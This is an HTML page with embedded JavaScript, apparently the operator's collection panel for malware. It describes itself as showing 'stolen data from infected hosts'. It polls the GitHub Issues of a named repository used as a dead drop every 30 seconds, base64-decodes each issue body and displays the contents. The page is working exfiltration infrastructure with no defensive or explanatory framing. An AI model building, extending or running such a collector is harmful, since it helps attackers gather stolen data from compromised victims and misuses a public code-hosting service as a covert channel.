<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>0xB0 — Collector</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>📡 0xB0 Exfil Dashboard</h1>
        <p>Stolen data from infected hosts appears below. Decoded from GitHub Issues.</p>
        <button id="refreshBtn">⟳ Refresh</button>
        <div id="log" class="log-area">
            <span class="placeholder">Waiting for data...</span>
        </div>
    </div>

    <script>
        const REPO = 'va1uxxx/0xB0';
        const API_URL = `https://api.github.com/repos/${REPO}/issues`;

        async function fetchExfilData() {
            try {
                const response = await fetch(API_URL, {
                    headers: { 'Accept': 'application/vnd.github.v3+json' }
                });
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                const issues = await response.json();

                const logDiv = document.getElementById('log');
                logDiv.innerHTML = '';

                if (issues.length === 0) {
                    logDiv.innerHTML = '<span class="placeholder">No data received yet.</span>';
                    return;
                }

                // Display issues in reverse chronological order (newest first)
                issues.reverse().forEach(issue => {
                    const entry = document.createElement('div');
                    entry.className = 'entry';

                    const title = document.createElement('div');
                    title.className = 'entry-title';
                    title.textContent = `#${issue.number} — ${issue.title}`;

                    const timestamp = document.createElement('div');
                    timestamp.className = 'entry-time';
                    timestamp.textContent = new Date(issue.created_at).toLocaleString();

                    let bodyText = issue.body || '';
                    // Attempt to decode Base64 (assuming malware encodes payload)
                    let decoded = '';
                    try {
                        decoded = atob(bodyText);
                    } catch {
                        decoded = bodyText; // fallback if not base64
                    }

                    const content = document.createElement('pre');
                    content.className = 'entry-body';
                    content.textContent = decoded.length > 2000 ? decoded.substring(0, 2000) + '... (truncated)' : decoded;

                    entry.appendChild(title);
                    entry.appendChild(timestamp);
                    entry.appendChild(content);
                    logDiv.appendChild(entry);
                });

            } catch (err) {
                document.getElementById('log').innerHTML = `<span class="error">⚠️ Error: ${err.message}</span>`;
            }
        }

        document.getElementById('refreshBtn').addEventListener('click', fetchExfilData);

        // Auto-refresh every 30 seconds
        fetchExfilData();
        setInterval(fetchExfilData, 30000);
    </script>
</body>
</html>
